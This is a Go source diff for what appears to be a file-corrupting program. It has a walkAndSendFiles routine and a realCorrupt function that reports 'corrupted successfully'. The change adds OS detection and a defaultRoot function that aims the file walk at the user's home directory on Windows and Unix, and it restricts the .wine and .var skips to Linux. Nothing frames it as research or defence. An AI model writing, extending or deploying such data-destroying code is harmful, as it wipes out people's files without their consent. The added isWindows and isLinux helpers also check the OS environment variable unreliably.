@@ -6,10 +6,19 @@ import (
 	"math/rand"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
 )
+
+func isWindows() bool {
+	return strings.Contains(os.Getenv("OS"), "Windows")
+}
+
+func isLinux() bool {
+	return strings.Contains(os.Getenv("OS"), "Linux")
+}
 
 func loggingSystem(message string) {
 	//create a log file
@@ -37,18 +46,15 @@ func walkAndSendFiles(root string, fileChan chan<- string) {
 			return nil
 		}
 		if info.IsDir() {
+			if runtime.GOOS == "linux" && strings.Contains(path, ".wine") {
+				loggingSystem("passed .wine folder")
+				return filepath.SkipDir
+			}
+			if runtime.GOOS == "linux" && strings.Contains(path, ".var") {
+				loggingSystem("passed .var folder")
+				return filepath.SkipDir
+			}
 			return nil // skip folders
-		}
-
-		// skipping the .wine folder for linux laptops cause i like linux
-		if strings.Contains(path, ".wine") {
-			loggingSystem("passed .wine folder")
-			return filepath.SkipDir
-		}
-
-		if strings.Contains(path, ".var") {
-			loggingSystem("passed .var folder")
-			return filepath.SkipDir
 		}
 
 		if strings.HasSuffix(path, ".exe") {
@@ -112,6 +118,24 @@ func realCorrupt(filePath string) (status string, err error) {
 	}
 
 	return "corrupted successfully", nil
+}
+
+func defaultRoot() string {
+	// windows system
+	if runtime.GOOS == "windows" {
+		home := os.Getenv("USERPROFILE")
+		if home != "" {
+			return home
+		}
+		return "C:\\"
+	}
+
+	// unix like system
+	home := os.Getenv("HOME")
+	if home != "" {
+		return home
+	}
+	return "/home"
 }
 
 func main() {
